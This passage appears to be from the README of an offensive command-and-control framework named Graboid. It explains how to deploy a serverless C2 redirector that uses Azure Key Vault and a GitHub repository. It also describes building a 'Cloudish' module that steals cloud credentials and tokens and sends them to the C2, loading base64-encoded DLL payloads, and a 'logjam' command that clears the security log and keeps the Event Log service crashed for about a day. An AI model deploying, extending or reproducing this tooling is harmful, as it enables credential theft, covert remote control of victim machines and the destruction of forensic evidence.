</p>

##### Deploy KeyVaults Function and Configure

Serverless C2 API/redirector, requires keyVault and managed Identity or access policy. KeyVault URL is stored in an env var. The API uses a scoped token to your github repo allowing read/write on the contents only. Store it in keyvault as ghToken, need the repoName and username and some other settings stored in the vault. The Function will retrieve what it needs to access github and read/write C2 as agents check in and post results. Bocklist is a good idea but not really implemented anymore. More to come on that.

xHooktoken is your agent's client api key, the other tokens are server-side api keys.

##### Deploy Keyvault with Secrets
```powershell
$vaultName = ""
$location = ""
$groupname = ""

# will prompt for values of the secrets needed for redirector
.\Scripts\Gen-Keyvault.ps1 -Vaultname $vaultName -locationname $location -groupname $groupname 
```

<!-- ##### Modules -->

<p align="center" style="font-size: 48px; font-weight: bold;">
    Graboid Modules
</p>

<p align="center">
    <img src="graboid.webp" alt="Stealer Module" height="300"/>
</p>

Included is one module 'Cloudish' which steals cloud credentials, tokens, configs, etc and posts to the C2. Compile it as a dll, then base64 encode and upload the txt file into 'assets'

```powershell
cd Modules\CloudishModule
dotnet build -c Release .
cd .\bin\release
base64.exe -n 0 -i .\cloudish.dll -o cloudish.txt
```

Put processed modules and other DLLs as base64 encoded text files aka 'roadtoken.txt' in 'assets' folder in root of the repo. The /assets/ route can be used to pull down libraries or execute tools, just compile them as dlls and add <Module>.Modes namespace, <moduleName> Class and Execute() method that does what you want. Create a new 'elseif' in the agent's Main method to handle the invocation f the new module and add new method calls as needed.



***TODO: Pull the blocklist and user agent blocks from the phishing functions and implement it in this project.

This tailored approach is designed to uncover hidden tokens that are crucial for access and authentication but are typically shielded from user and system visibility.
- **Output:** Outputs detailed token information including usernames, process origins, audience scope, and the complete token data. This output is vital for assessing security permissions and potential vulnerabilities in a Microsoft 365 environment. It mirrors the functionality of SharpTokenFinder, offering a specialized focus on security and compliance audits within enterprise settings.

##### `logjam` # Works as Exe, not as DLL
- **Description:** Forces the crash of the Event Log service on a specified server or local machine. This is used primarily to interrupt logging activities temporarily.
- **Usage:** `logjam`
- **Details:** This command utilizes native Windows API calls to interact directly with the Event Log service. It can target the local machine (if run with administrative privileges) or a remote server to clear the security log and cause a service crash. This is repeated multiple times to ensure the Event Log service does not restart immediately, aiming to keep it disabled for an extended period (approximately 24 hours).
- **Output:** Outputs messages about the status of the Event Log service, including confirmation of crashes and restart checks. Each step of the process is logged, providing feedback such as successful log clearing and any errors encountered during the operation.

##### `mori` - **Currently buggy, may not be capturing the output correctly or is taking forever (no results for a long time than they resume)**
